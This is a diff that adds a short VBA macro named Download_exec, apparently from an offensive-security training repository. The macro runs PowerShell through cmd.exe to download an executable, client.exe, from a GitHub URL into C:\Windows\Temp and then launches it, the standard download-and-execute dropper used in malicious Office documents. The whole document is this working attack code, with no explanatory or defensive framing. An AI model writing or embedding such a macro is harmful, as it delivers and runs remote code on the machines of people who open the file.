@@ -1,0 +1,4 @@
+Sub Download_exec()
+pid = Shell("cmd.exe /c PowerShell -c (New-Object System.Net.WebClient).DownloadFile('https://github.com/h41stur/dojo/blob/main/semana_04/client.exe?raw=true','C:\Windows\Temp\client.exe')", 1)
+pid2 = Shell("cmd.exe /c PowerShell -c Start-Process ('C:\Windows\Temp\client.exe')", 1)
+End Sub
